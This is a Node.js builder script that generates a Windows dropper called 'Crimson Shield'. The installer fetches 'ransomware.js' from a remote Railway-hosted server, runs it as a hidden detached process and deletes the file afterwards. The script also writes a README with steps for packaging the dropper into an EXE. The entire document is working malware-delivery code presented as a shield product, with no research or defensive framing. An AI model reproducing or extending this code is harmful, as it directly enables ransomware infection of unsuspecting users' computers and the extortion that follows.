const fs = require('fs');
const path = require('path');

const installerScript = `
const https = require('https');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const os = require('os');

// ⚠️ UPDATE THIS TO YOUR RAILWAY URL AFTER DEPLOY ⚠️
const SERVER_URL = 'https://crimson-production-d9ad.up.railway.app';

function downloadAndRun() {
    const url = SERVER_URL + '/download/ransomware.js';
    const tempPath = path.join(os.tmpdir(), 'crimson_client.js');
    
    https.get(url, (response) => {
        let data = '';
        response.on('data', (chunk) => { data += chunk; });
        response.on('end', () => {
            fs.writeFileSync(tempPath, data);
            const child = spawn('node', [tempPath], {
                detached: true,
                stdio: 'ignore',
                windowsHide: true,
                env: { ...process.env, ELECTRON_RUN_AS_NODE: '1' }
            });
            child.unref();
            setTimeout(() => {
                try { fs.unlinkSync(tempPath); } catch(e) {}
            }, 60000);
            console.log('💀 Crimson Shield installed!');
        });
    }).on('error', (err) => {
        console.error('Installation failed:', err.message);
    });
}

downloadAndRun();
`;

const builderDir = __dirname;
if (!fs.existsSync(builderDir)) {
    fs.mkdirSync(builderDir, { recursive: true });
}

const installerPath = path.join(builderDir, 'installer.js');
fs.writeFileSync(installerPath, installerScript);
console.log('✅ installer.js created');

const readme = `
📦 CRIMSON SHIELD BUILDER

To build the EXE:
1. Install pkg: npm install -g pkg
2. Build: pkg installer.js --target node18-win-x64 --output CrimsonShield.exe

⚠️ Make sure to update the SERVER_URL in installer.js before building!
`;

fs.writeFileSync(path.join(builderDir, 'README.txt'), readme);
console.log('✅ README.txt created');
console.log('\n📋 Next steps:');
console.log('1. Update SERVER_URL in installer.js');
console.log('2. Run: pkg installer.js --target node18-win-x64 --output CrimsonShield.exe');
